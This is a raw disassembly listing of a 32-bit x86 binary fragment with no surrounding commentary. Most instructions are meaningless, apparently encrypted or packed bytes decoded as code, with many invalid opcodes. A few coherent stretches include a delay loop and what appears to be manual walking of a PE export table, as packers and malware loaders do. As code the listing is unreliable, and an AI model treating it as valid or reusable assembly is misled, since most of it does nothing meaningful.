  40ad37:	shr    BYTE PTR [edi+0x74],0x93
  40ad3b:	ss sub ah,al
  40ad3e:	in     al,dx
  40ad3f:	xor    bh,BYTE PTR ds:0xe5c91fcb
  40ad45:	mov    ebx,esp
  40ad47:	std    
  40ad48:	mov    WORD PTR [edi+eax*2-0x2f8b30bf],ss
  40ad4f:	pop    ss
  40ad50:	hlt    
  40ad51:	rol    BYTE PTR [edx+0x53],0xc4
  40ad55:	pop    edi
  40ad56:	inc    edx
  40ad57:	cmp    BYTE PTR [edx-0x12b74d56],0xba
  40ad5e:	mov    al,0x43
  40ad60:	(bad)  
  40ad61:	add    bl,ah
  40ad63:	or     al,0x88
  40ad65:	fisub  DWORD PTR [edi+0x56226748]
  40ad6b:	mov    ah,0xce
  40ad6d:	push   ecx
  40ad6e:	ss push cs
  40ad70:	loop   0x40ad80
  40ad72:	sub    al,BYTE PTR [ecx+0x4d]
  40ad75:	sahf   
  40ad76:	fisttp DWORD PTR [eax-0x2a]
  40ad79:	xchg   ebp,eax
  40ad7a:	aaa    
  40ad7b:	out    dx,al
  40ad7c:	push   es
  40ad7d:	mov    eax,ds:0x508fe19c
  40ad82:	and    dl,ch
  40ad84:	add    al,0x16
  40ad86:	rep lods al,BYTE PTR fs:[esi]
  40ad89:	int    0xc8
  40ad8b:	mov    BYTE PTR [ebp-0x48],cl
  40ad8e:	inc    edi
  40ad8f:	sti    
  40ad90:	xchg   DWORD PTR [ebx],eax
  40ad92:	jge    0x40ada6
  40ad94:	mov    WORD PTR [ecx],fs
  40ad96:	dec    edi
  40ad97:	fsubr  DWORD PTR fs:[ecx+0x5e074432]
  40ad9e:	ror    BYTE PTR [ebp+0x2f51d162],cl
  40ada4:	nop
  40ada5:	lds    ebp,FWORD PTR [edi+edi*2+0x11]
  40ada9:	es mov edi,0x10f4e209
  40adaf:	pop    ds
  40adb0:	lock fdivr DWORD PTR [ebx+0x6a]
  40adb4:	retf   0xe3f2
  40adb7:	pop    edx
  40adb8:	bound  esi,QWORD PTR [edx-0x51]
  40adbb:	and    ah,bl
  40adbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adbe:	xchg   edi,eax
  40adbf:	retf   0x5590
  40adc2:	jae    0x40adba
  40adc4:	xchg   ebx,eax
  40adc5:	xlat   BYTE PTR ds:[ebx]
  40adc6:	loopne 0x40ae2b
  40adc8:	cmc    
  40adc9:	push   ebp
  40adca:	imul   edi,DWORD PTR [edi],0xe0fff02e
  40add0:	sbb    bl,BYTE PTR [edx]
  40add2:	(bad)
  40add5:	shl    ah,0x80
  40add8:	adc    esi,DWORD PTR ds:[ecx+0x5d4766b9]
  40addf:	jge    0x40ae12
  40ade1:	jecxz  0x40ada2
  40ade3:	out    0x2c,al
  40ade5:	xchg   edx,eax
  40ade6:	ror    ah,0x9c
  40ade9:	xor    eax,edx
  40adeb:	push   ebp
  40adec:	inc    ecx
  40aded:	cli    
  40adee:	jno    0x40ae02
  40adf0:	inc    ebx
  40adf1:	jl     0x40adee
  40adf3:	bound  esp,QWORD PTR [edi-0x1b]
  40adf6:	and    BYTE PTR ds:0x76c8c01f,0xa6
  40adfd:	xor    al,0x5b
  40adff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae00:	sub    BYTE PTR [ebp+0x33],al
  40ae03:	int    0x9e
  40ae05:	jp     0x40ad98
  40ae07:	adc    edi,esp
  40ae09:	and    eax,0x5bd41e95
  40ae0e:	sbb    BYTE PTR [ecx+eax*8-0x2b],dh
  40ae12:	or     eax,DWORD PTR [ecx+0x42]
  40ae15:	pop    esi
  40ae16:	jmp    0x22b9:0x45833be8
  40ae1d:	and    cl,0xed
  40ae20:	outs   dx,DWORD PTR ds:[esi]
  40ae21:	loop   0x40ae08
  40ae23:	xchg   ecx,eax
  40ae24:	xor    DWORD PTR [ebx],eax
  40ae26:	and    dl,ch
  40ae28:	dec    eax
  40ae29:	repz fwait
  40ae2b:	or     al,0xa4
  40ae2d:	jp     0x40adb9
  40ae2f:	sti    
  40ae30:	pop    ebx
  40ae31:	push   cs
  40ae32:	add    eax,0x8d21b5c8
  40ae37:	outs   dx,BYTE PTR ds:[esi]
  40ae38:	and    edx,DWORD PTR [edx+edi*2+0x59]
  40ae3c:	out    dx,eax
  40ae3d:	push   ds
  40ae3e:	push   ecx
  40ae3f:	push   edi
  40ae40:	xchg   ebp,eax
  40ae41:	mov    ah,0x70
  40ae43:	dec    esi
  40ae44:	jnp    0x40adf4
  40ae46:	dec    edi
  40ae47:	jecxz  0x40ae5f
  40ae49:	mov    eax,ds:0x40370878
  40ae4e:	push   esp
  40ae4f:	inc    eax
  40ae50:	mov    esp,0x651b0101
  40ae55:	into   
  40ae56:	push   es
  40ae57:	cmp    esi,DWORD PTR [eax+0x20]
  40ae5a:	push   ds
  40ae5b:	ja     0x40aea0
  40ae5d:	sub    ah,al
  40ae5f:	repnz imul esi,DWORD PTR [eax+0x50c7ba7c],0x77
  40ae67:	push   ebp
  40ae68:	push   esp
  40ae69:	sub    eax,ecx
  40ae6b:	xor    ch,0xa3
  40ae6e:	adc    al,0x3b
  40ae70:	push   esi
  40ae71:	aas    
  40ae72:	mov    dh,BYTE PTR [esp+esi*4]
  40ae75:	dec    edx
  40ae76:	ss adc eax,ecx
  40ae79:	fild   QWORD PTR [eax]
  40ae7b:	pop    ebx
  40ae7c:	xchg   esi,eax
  40ae7d:	xchg   DWORD PTR [edi],ebp
  40ae7f:	pop    ss
  40ae80:	and    al,0xa1
  40ae82:	dec    ebx
  40ae83:	popf   
  40ae84:	not    BYTE PTR [edi]
  40ae86:	into   
  40ae87:	cmp    DWORD PTR [edi+0x74],0x72ae268c
  40ae8e:	int    0xac
  40ae90:	add    BYTE PTR [edx],dh
  40ae92:	mov    edx,0xf421ee9e
  40ae97:	(bad)  
  40ae98:	mov    eax,0x6278a1db
  40ae9d:	test   al,0x2e
  40ae9f:	pop    esi
  40aea0:	in     eax,dx
  40aea1:	test   DWORD PTR [eax-0x8bc6875],esi
  40aea7:	dec    edi
  40aea8:	idiv   cl
  40aeaa:	shr    DWORD PTR [esi],1
  40aeac:	pop    ebx
  40aead:	outs   dx,DWORD PTR ds:[esi]
  40aeae:	mov    edx,0x7c600b10
  40aeb3:	and    al,0x14
  40aeb5:	xchg   ecx,eax
  40aeb6:	cmp    eax,0xff49706b
  40aebb:	push   ds
  40aebc:	out    0xb,al
  40aebe:	fs sahf 
  40aec0:	into   
  40aec1:	les    ebp,FWORD PTR [ebp-0xa]
  40aec4:	lods   al,BYTE PTR ds:[esi]
  40aec5:	and    DWORD PTR [edx+0x5],edx
  40aec8:	xchg   esi,eax
  40aec9:	pop    ecx
  40aeca:	xor    eax,0xe4ba2665
  40aecf:	mov    cl,0xbf
  40aed1:	push   ds
  40aed2:	rcr    DWORD PTR [eax+0x6a],cl
  40aed5:	xchg   esp,eax
  40aed6:	data16 jp 0x40aedb
  40aed9:	jecxz  0x40af4c
  40aedb:	xchg   edx,eax
  40aedc:	jno    0x40ae87
  40aede:	dec    ebx
  40aedf:	daa    
  40aee0:	lahf   
  40aee1:	jb     0x40af08
  40aee3:	push   eax
  40aee4:	cmp    eax,0x22d13369
  40aee9:	inc    edi
  40aeea:	push   ecx
  40aeeb:	mov    edi,0x745d522
  40aef0:	mov    cl,BYTE PTR [ecx+edx*1-0x6ed24232]
  40aef7:	enter  0xb8c9,0xf5
  40aefb:	inc    edx
  40aefc:	pop    eax
  40aefd:	sub    al,0xa5
  40aeff:	loop   0x40aeec
  40af01:	pop    ebx
  40af02:	hlt    
  40af03:	jmp    0x9f874450
  40af08:	pop    ds
  40af09:	jb     0x40aeec
  40af0b:	fs loopne 0x40af1c
  40af0e:	xor    DWORD PTR [esi+eiz*1+0x454e7e22],esp
  40af15:	arpl   WORD PTR [ecx-0x6ac7c7dc],bp
  40af1b:	or     ecx,eax
  40af1d:	and    DWORD PTR [edx-0x30],eax
  40af20:	xor    ch,ah
  40af22:	nop
  40af23:	ret    
  40af24:	jne    0x40af4e
  40af26:	loop   0x40af2b
  40af28:	daa    
  40af29:	data16 stos BYTE PTR es:[edi],al
  40af2b:	stos   BYTE PTR es:[edi],al
  40af2c:	js     0x40aef3
  40af2e:	div    BYTE PTR [eax+0x79c3cd2b]
  40af34:	jnp    0x40af6f
  40af36:	jmp    FWORD PTR [edx]
  40af38:	adc    eax,0x1a1a63cf
  40af3d:	shl    DWORD PTR [eax],0xe5
  40af40:	bound  ebp,QWORD PTR [ecx]
  40af42:	jne    0x40af93
  40af44:	retf   
  40af45:	push   esp
  40af46:	sahf   
  40af47:	mov    esi,0x4d343282
  40af4c:	jge    0x40af8a
  40af4e:	aaa    
  40af4f:	add    BYTE PTR [ebx-0x7c],0xc9
  40af53:	pop    ebp
  40af54:	mov    bl,0x47
  40af56:	xor    al,0xae
  40af58:	lock fs (bad) 
  40af5b:	or     cl,bl
  40af5d:	ficom  DWORD PTR [bx+di-0x774c]
  40af62:	nop
  40af63:	sbb    eax,0x4471268f
  40af68:	mov    edx,0x9cdee6ed
  40af6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af6e:	mov    ch,BYTE PTR [eax-0x1f]
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	imul   edi,ecx,0xf7649a63
  40b01d:	jle    0x40b09d
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	mov    WORD PTR ds:0xb3ffcb39,?
  40b029:	inc    esp
  40b02a:	jge    0x40b017
  40b02c:	jg     0x40b0ac
  40b02e:	or     bl,bl
  40b030:	or     eax,0xa5c31d8d
  40b035:	cmp    DWORD PTR [edi],esi
  40b037:	xchg   edx,eax
  40b038:	xchg   ebp,eax
  40b039:	(bad)  
  40b03a:	push   ebx
  40b03b:	cli    
  40b03c:	push   eax
  40b03d:	and    al,0x57
  40b03f:	in     al,0x57
  40b041:	jg     0x40b064
  40b043:	xor    DWORD PTR [edi],esi
  40b045:	(bad)
  40b048:	mov    dh,0xec
  40b04a:	mov    dh,0x86
  40b04c:	push   edi
  40b04d:	jo     0x40b07f
  40b04f:	or     ebp,DWORD PTR [ebp-0x249a169f]
  40b055:	test   BYTE PTR [edi],al
  40b057:	pop    ds
  40b058:	into   
  40b059:	xchg   ecx,eax
  40b05a:	inc    edx
  40b05b:	and    DWORD PTR [esi-0x12],0x884fbc02
  40b062:	daa    
  40b063:	shl    ebx,cl
  40b065:	mov    DWORD PTR [ebx+0x340bfda2],edx
  40b06b:	or     ebp,DWORD PTR [ebp+0x63]
  40b06e:	(bad)  
  40b06f:	adc    cl,BYTE PTR [esp+ebp*4-0x37]
  40b073:	pop    edi
  40b074:	stc    
  40b075:	(bad)  
  40b076:	iret   
  40b077:	out    0x66,eax
  40b079:	fwait
  40b07a:	xor    BYTE PTR [eax+0x2795996a],0x5d
  40b081:	and    al,0x2
  40b083:	ins    BYTE PTR es:[edi],dx
  40b084:	xor    BYTE PTR [ebx],bh
  40b086:	les    ebx,FWORD PTR [eax-0x4fce274]
  40b08c:	imul   ecx,eax,0x2
  40b08f:	cld    
  40b090:	popf   
  40b091:	ficomp WORD PTR [edi+ebx*4+0x41]
  40b095:	ja     0x40b072
  40b097:	xor    al,0xd4
  40b099:	cdq    
  40b09a:	xor    esp,DWORD PTR [ecx-0x26]
  40b09d:	test   BYTE PTR [edi+esi*4-0x5ae89f84],bh
  40b0a4:	out    0x1d,eax
  40b0a6:	mov    dl,0x4d
  40b0a8:	mov    ebp,0xabf02cae
  40b0ad:	aad    0xb3
  40b0af:	pop    es
  40b0b0:	mov    esp,0xf9f8da51
  40b0b5:	push   edx
  40b0b6:	push   edx
  40b0b7:	aam    0xa7
  40b0b9:	jae    0x40b112
  40b0bb:	rol    BYTE PTR [edi],1
  40b0bd:	sahf   
  40b0be:	and    al,0x94
  40b0c0:	pop    esi
  40b0c1:	ja     0x40b079
  40b0c3:	outs   dx,BYTE PTR ds:[esi]
  40b0c4:	pop    esp
  40b0c5:	les    esi,FWORD PTR [eax-0x2a]
  40b0c8:	pop    ebx
  40b0c9:	and    BYTE PTR [edx+eax*2+0x53c626a8],bh
  40b0d0:	or     bh,BYTE PTR [esi+0x4f]
  40b0d3:	int3   
  40b0d4:	adc    eax,eax
  40b0d6:	cwde   
  40b0d7:	mov    ?,WORD PTR [eax-0xb]
  40b0da:	sbb    al,BYTE PTR [edx+0x76d59df8]
  40b0e0:	push   ds
  40b0e1:	(bad)  
  40b0e2:	mov    ebx,0x2378a749
  40b0e7:	stos   BYTE PTR es:[edi],al
  40b0e8:	push   0xffffffda
  40b0ea:	lods   al,BYTE PTR ds:[esi]
  40b0eb:	inc    ebp
  40b0ec:	fstp   DWORD PTR [edx+ebx*8-0x7e]
  40b0f0:	mov    al,ds:0xfd00125
  40b0f5:	mov    edx,0x4003918a
  40b0fa:	xor    eax,0xf8c0ee78
  40b0ff:	mov    esp,0x7fc2c0f2
  40b104:	lds    ebp,FWORD PTR [ecx+edx*2]
  40b107:	push   eax
  40b108:	push   0x71
  40b10a:	pusha  
  40b10b:	scas   al,BYTE PTR es:[edi]
  40b10c:	aad    0xae
  40b10e:	call   DWORD PTR [esi]
  40b110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b111:	and    cl,0x41
  40b114:	sti    
  40b115:	imul   edx,DWORD PTR [ecx+0x37],0x2b
  40b119:	rcl    DWORD PTR [edx],0x6b
  40b11c:	jle    0x40b0ee
  40b11e:	mov    edi,0x24f250a
  40b123:	or     BYTE PTR ds:0x53fc1cbe,bh
  40b129:	push   ds
  40b12a:	aam    0xd9
  40b12c:	jecxz  0x40b189
  40b12e:	aam    0x34
  40b130:	lock mov ecx,0xfdb1ea1a
  40b137:	push   esi
  40b138:	retf   
  40b139:	out    0xb5,al
  40b13b:	push   esi
  40b13c:	popf   
  40b13d:	fld    QWORD PTR ss:[edx-0x5ffea5a9]
  40b144:	stos   BYTE PTR es:[edi],al
  40b145:	dec    edi
  40b146:	mov    al,0x8b
  40b148:	cmp    dh,BYTE PTR [ebp+0x44]
  40b14b:	or     edx,ecx
  40b14d:	and    DWORD PTR [ecx],ebp
  40b14f:	fsub   st(2),st
  40b151:	adc    ch,BYTE PTR [ebp+0x4b2bdc0f]
  40b157:	mov    ss,WORD PTR [esp+eiz*4]
  40b15a:	in     al,0x67
  40b15c:	fldl2e 
  40b15e:	lock adc dl,BYTE PTR [esi]
  40b161:	ret    
  40b162:	or     esi,DWORD PTR [esi+0x7b]
  40b165:	call   FWORD PTR [ebp-0xf]
  40b168:	jno    0x40b186
  40b16a:	jb     0x40b1e0
  40b16c:	jge    0x40b17b
  40b16e:	fsub   st(0),st
  40b170:	fbld   TBYTE PTR [ebx-0x75]
  40b173:	push   0xffffff84
  40b175:	dec    edi
  40b176:	and    esi,edi
  40b178:	pop    ebx
  40b179:	in     eax,dx
  40b17a:	cli    
  40b17b:	adc    al,0xe
  40b17d:	mov    ecx,0xd33ff30
  40b182:	ss js  0x40b167
  40b185:	mov    ds:0x5650acf0,al
  40b18a:	loope  0x40b1de
  40b18c:	xor    al,al
  40b18e:	arpl   WORD PTR [edi+0x47],bx
  40b191:	or     eax,0x7107d299
  40b196:	mov    ds:0x2c0c6c4f,al
  40b19b:	jmp    0x8857f7bf
  40b1a0:	ins    DWORD PTR es:[edi],dx
  40b1a1:	aaa    
  40b1a2:	fild   WORD PTR [ebx-0x5f930e5a]
  40b1a8:	jmp    0x14570a43
  40b1ad:	sbb    DWORD PTR [ebx],ebp
  40b1af:	jae    0x40b1db
  40b1b1:	cmp    eax,DWORD PTR [esi]
  40b1b3:	call   0x8bfa:0x5915055c
  40b1ba:	icebp  
  40b1bb:	sbb    eax,ecx
  40b1bd:	retf   0xaede
  40b1c0:	lds    ebx,FWORD PTR [esi+0x5c496aba]
  40b1c6:	add    bh,BYTE PTR [edx-0x5a]
  40b1c9:	iret   
  40b1ca:	xchg   ecx,eax
  40b1cb:	jbe    0x40b225
  40b1cd:	enter  0x5784,0x92
  40b1d1:	mov    dl,0x59
  40b1d3:	repz jmp 0x44df0515
  40b1d9:	mov    ch,0x63
  40b1db:	sbb    ah,cl
  40b1dd:	or     DWORD PTR [ecx*1-0x3d76e27e],edi
  40b1e4:	cmc    
  40b1e5:	aas    
  40b1e6:	mov    ebp,0x43c94727
  40b1eb:	aas    
  40b1ec:	xor    al,0x7
  40b1ee:	in     eax,0x6e
  40b1f0:	out    dx,al
  40b1f1:	lods   al,BYTE PTR ds:[esi]
  40b1f2:	push   ebx
  40b1f3:	aas    
  40b1f4:	cmp    DWORD PTR [edi+0x6c42e7f0],ecx
  40b1fa:	test   eax,0x4b753db9
  40b1ff:	imul   esi,DWORD PTR [esi-0x228bc98a],0xfffffffe
  40b206:	ins    DWORD PTR es:[edi],dx
  40b207:	lods   al,BYTE PTR ds:[esi]
  40b208:	inc    ebx
  40b209:	loopne 0x40b23b
  40b20b:	cmp    edx,DWORD PTR [ecx+0x285e53ff]
  40b211:	xchg   ebx,eax
  40b212:	cmp    dh,BYTE PTR [ecx]
  40b214:	or     bl,cl
  40b216:	inc    ecx
  40b217:	das    
  40b218:	xchg   edi,eax
  40b219:	inc    edx
  40b21a:	int    0xaa
  40b21c:	cli    
  40b21d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b21e:	pop    ebx
  40b21f:	mov    dl,0xdd
  40b221:	sub    BYTE PTR [edi],ch
  40b223:	pop    edx
  40b224:	add    ecx,DWORD PTR [esi+ebx*2-0x31]
  40b228:	sbb    BYTE PTR [edi-0x60],0x44
  40b22c:	cmp    DWORD PTR [ebx-0x21],0x1463a662
  40b233:	sbb    eax,ebp
  40b235:	xor    BYTE PTR [ebp-0x13],0xf0
  40b239:	fcomi  st,st(7)
  40b23b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b23c:	sbb    edx,edx
  40b23e:	das    
  40b23f:	int    0x92
  40b241:	mov    bh,0xbc
  40b243:	in     eax,0x88
  40b245:	inc    esi
  40b246:	cmp    BYTE PTR [edx+0x594f203a],0xd7
  40b24d:	xchg   ebp,eax
  40b24e:	es stos DWORD PTR es:[edi],eax
  40b250:	stos   BYTE PTR es:[edi],al
  40b251:	mov    esp,0x3009103b
  40b256:	push   esi
  40b257:	add    BYTE PTR ds:0x73ed6396,cl
  40b25d:	mov    edx,0x17d208e
  40b262:	(bad)  
  40b263:	(bad)  
  40b264:	scas   al,BYTE PTR es:[edi]
  40b265:	mov    bl,0x11
  40b267:	xchg   ebx,eax
  40b268:	or     ecx,DWORD PTR [ebx+0x4d8bec45]
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	ret    
  40b284:	pop    ds
  40b285:	jg     0x40b2d3
  40b287:	cs bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	test   esi,0x5eb7f0a3
  40b295:	xchg   esp,eax
  40b296:	lock or eax,0xaa1f6841
  40b29c:	adc    DWORD PTR [edi],0x8459aa73
  40b2a2:	sti    
  40b2a3:	gs test al,0x12
  40b2a6:	shl    BYTE PTR [ebp-0x65],1
  40b2a9:	call   0x28911fd4
  40b2ae:	fsubr  QWORD PTR [eax+0x62]
  40b2b1:	ds ss or edi,eax
  40b2b5:	dec    ebx
  40b2b6:	rol    DWORD PTR ds:0xe9f77bdb,cl
  40b2bc:	aaa    
  40b2bd:	sub    edx,DWORD PTR [ebx-0x7fddf0ed]
  40b2c3:	xchg   ebp,eax
  40b2c4:	dec    esp
  40b2c5:	mov    ebx,0xa1f74594
  40b2ca:	add    bl,al
  40b2cc:	or     ebp,edi
  40b2ce:	push   ebx
  40b2cf:	adc    BYTE PTR [ebp+0x67b6cbcd],dl
  40b2d5:	lahf   
  40b2d6:	jae    0x40b285
  40b2d8:	(bad)  
  40b2d9:	push   esi
  40b2da:	das    
  40b2db:	and    al,dh
  40b2dd:	xchg   esi,eax
  40b2de:	push   es
  40b2df:	pop    edi
  40b2e0:	jl     0x40b33c
  40b2e2:	into   
  40b2e3:	xchg   esi,eax
  40b2e4:	loopne 0x40b2f3
  40b2e6:	test   DWORD PTR [ebx+0x54],ebx
  40b2e9:	in     al,0xca
  40b2eb:	clc    
  40b2ec:	ret    0xba6e
  40b2ef:	jle    0x40b346
  40b2f1:	call   0x1daa:0x743afd2f
  40b2f8:	paddsw mm5,QWORD PTR [edi-0x2f]
  40b2fc:	in     eax,dx
  40b2fd:	mov    ecx,0x1d5a9fb5
  40b302:	and    bh,cl
  40b304:	cli    
  40b305:	mov    ah,BYTE PTR [edx+edi*2-0x9f0c9e5]
  40b30c:	arpl   WORD PTR [ecx+0x71069253],sp
  40b312:	inc    edi
  40b313:	mov    ds:0x7356edc0,al
  40b318:	scas   eax,DWORD PTR es:[edi]
  40b319:	and    BYTE PTR [ecx-0x29],dl
  40b31c:	jmp    DWORD PTR [ecx]
  40b31e:	into   
  40b31f:	in     al,0xed
  40b321:	daa    
  40b322:	icebp  
  40b323:	in     eax,dx
  40b324:	cmp    BYTE PTR [eax-0x1485b848],ch
  40b32a:	(bad)  
  40b32b:	sub    eax,0xf6cd3960
  40b330:	pop    ecx
  40b331:	push   eax
  40b332:	jmp    0xbd9b:0x3be5edd7
  40b339:	(bad)  [eax]
  40b33b:	mov    ds:0x4a210d94,al
  40b340:	daa    
  40b341:	ins    BYTE PTR es:[edi],dx
  40b342:	cmp    DWORD PTR [ebx+ecx*4],ebx
  40b345:	test   DWORD PTR [esi+0x2216b602],0xe5711b23
  40b34f:	lahf   
  40b350:	inc    edx
  40b351:	mov    ecx,0xdc425664
  40b356:	mov    cl,0xc4
  40b358:	(bad)  
  40b359:	mov    cl,0xc1
  40b35b:	adc    cl,ch
  40b35d:	scas   al,BYTE PTR es:[edi]
  40b35e:	or     edx,esp
  40b360:	mov    ds:0x4b9edf1f,al
  40b365:	mov    cl,0x3d
  40b367:	or     al,0xe8
  40b369:	aas    
  40b36a:	mov    ds:0x375d6ab3,al
  40b36f:	xchg   esi,eax
  40b370:	fimul  DWORD PTR [ecx+0x76]
  40b373:	leave  
  40b374:	sub    dh,bh
  40b376:	packsswb mm0,QWORD PTR [ebx+0x67]
  40b37a:	fild   DWORD PTR [edx]
  40b37c:	ret    
  40b37d:	push   esp
  40b37e:	in     al,dx
  40b37f:	jle    0x40b3ea
  40b381:	ja     0x40b367
  40b383:	les    ecx,FWORD PTR [ecx]
  40b385:	or     eax,0xae1afa6f
  40b38a:	dec    esp
  40b38b:	frstor [esi]
  40b38d:	fbstp  TBYTE PTR [eax]
  40b38f:	pop    eax
  40b390:	repnz xchg esi,eax
  40b392:	lock aad 0xba
  40b395:	xlat   BYTE PTR ds:[ebx]
  40b396:	rcl    BYTE PTR [esi-0x5c],1
  40b399:	dec    ecx
  40b39a:	fld    DWORD PTR ds:0x9b029056
  40b3a0:	mov    dl,0x6c
  40b3a2:	push   0xa8f51387
  40b3a7:	or     eax,0xf5197e2e
  40b3ac:	(bad)  
  40b3ad:	icebp  
  40b3ae:	lods   al,BYTE PTR ds:[esi]
  40b3af:	pop    edi
  40b3b0:	fstp   QWORD PTR [edi]
  40b3b2:	and    dl,BYTE PTR [ecx]
  40b3b4:	mov    ebp,0x8e08dc3b
  40b3b9:	dec    ebp
  40b3ba:	fsubr  DWORD PTR [ecx]
  40b3bc:	cmp    al,0xfb
  40b3be:	mov    bh,0x4b
  40b3c0:	cdq    
  40b3c1:	or     eax,0x161c9cdf
  40b3c6:	mov    bl,0x9
  40b3c8:	test   eax,0xab015a4a
  40b3cd:	xor    DWORD PTR [ecx+ebx*2],edi
  40b3d0:	sbb    eax,DWORD PTR [edi+0x262664d6]
  40b3d6:	aas    
  40b3d7:	push   0x6e
  40b3d9:	es jmp 0x297c065
  40b3df:	mov    dl,0xbf
  40b3e1:	or     BYTE PTR [esi-0x23],0x7a
  40b3e5:	mov    dl,0xcc
  40b3e7:	or     eax,0x9186bc50
  40b3ec:	aas    
  40b3ed:	retf   0xa5b7
  40b3f0:	addr16 inc ebx
  40b3f2:	inc    edx
  40b3f3:	inc    edx
  40b3f4:	stc    
  40b3f5:	push   cs
  40b3f6:	cld    
  40b3f7:	xor    eax,0xcb19cf3d
  40b3fc:	aam    0xac
  40b3fe:	icebp  
  40b3ff:	addr16 pusha 
  40b401:	retf   0x4db9
  40b404:	fwait
  40b405:	push   es
  40b406:	jne    0x40b452
  40b408:	jo     0x40b40a
  40b40a:	sub    eax,0xb1769c1e
  40b40f:	fs adc eax,0x60815cce
  40b415:	ret    0x18a8
  40b418:	push   0xc2b24ab0
  40b41d:	sbb    eax,0x81b3fb57
  40b422:	aas    
  40b423:	pop    ds
  40b424:	sub    BYTE PTR [ebx-0x73],cl
  40b427:	mov    al,0xb2
  40b429:	add    eax,0x60e8fefa
  40b42e:	jbe    0x40b3ce
  40b430:	in     eax,0xa1
  40b432:	popf   
  40b433:	push   ds
  40b434:	mov    ds:0xafd7936,al
  40b439:	rcl    BYTE PTR [ebx-0x2f],cl
  40b43c:	push   ecx
  40b43d:	mov    edx,0x92436f44
  40b442:	clc    
  40b443:	jbe    0x40b46e
  40b445:	jl     0x40b42a
  40b447:	adc    ecx,esp
  40b449:	shl    BYTE PTR [eax],0x1d
  40b44c:	push   edx
  40b44d:	push   ebp
  40b44e:	mov    dl,BYTE PTR [edx]
  40b450:	lahf   
  40b451:	dec    esp
  40b452:	mov    edx,0xcf9ac362
  40b457:	not    BYTE PTR [eax-0x79328f79]
  40b45d:	xor    al,BYTE PTR [ebp+eiz*1-0x8534a7]
  40b464:	mov    dl,0x6c
  40b466:	pop    edi
  40b467:	ins    BYTE PTR es:[edi],dx
  40b468:	inc    edi
  40b469:	fidiv  WORD PTR [eax+0x3f]
  40b46c:	add    ebx,0x421e4310
  40b472:	pop    edx
  40b473:	mov    ecx,0x8a838866
  40b478:	in     ax,dx
  40b47a:	xor    al,0xb8
  40b47c:	aad    0x6a
  40b47e:	mov    ah,bh
  40b480:	aam    0x34
  40b482:	test   eax,0x41e43292
  40b487:	mov    cl,BYTE PTR [ebx-0x20a77a5a]
  40b48d:	xlat   BYTE PTR ds:[ebx]
  40b48e:	mov    bh,0x16
  40b490:	inc    edi
  40b491:	dec    edi
  40b492:	retf   0x2103
  40b495:	xlat   BYTE PTR ds:[ebx]
  40b496:	or     al,BYTE PTR [eax+0x33a15d68]
  40b49c:	lahf   
  40b49d:	addr16 mov ds,cx
  40b4a1:	inc    ebx
  40b4a2:	lahf   
  40b4a3:	xchg   ebp,eax
  40b4a4:	mov    esi,0x460fa1d7
  40b4a9:	loope  0x40b48b
  40b4ab:	scas   eax,DWORD PTR es:[edi]
  40b4ac:	dec    DWORD PTR [esi-0x1e]
  40b4af:	lahf   
  40b4b0:	push   ebx
  40b4b1:	je     0x40b457
  40b4b3:	call   0x73e3:0x46fa0866
  40b4ba:	fucom  st(6)
  40b4bc:	mov    edx,0x332ec162
  40b4c1:	aaa    
  40b4c2:	jecxz  0x40b4d8
  40b4c4:	out    dx,al
  40b4c5:	js     0x40b519
  40b4c7:	jge    0x40b4c6
  40b4c9:	inc    edi
  40b4ca:	outs   dx,BYTE PTR ds:[esi]
  40b4cb:	mov    DWORD PTR [ebp+0x207cdfef],ecx
  40b4d1:	adc    ecx,edi
  40b4d3:	pop    ecx
  40b4d4:	test   BYTE PTR [ecx+0x458bd44d],0xec
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
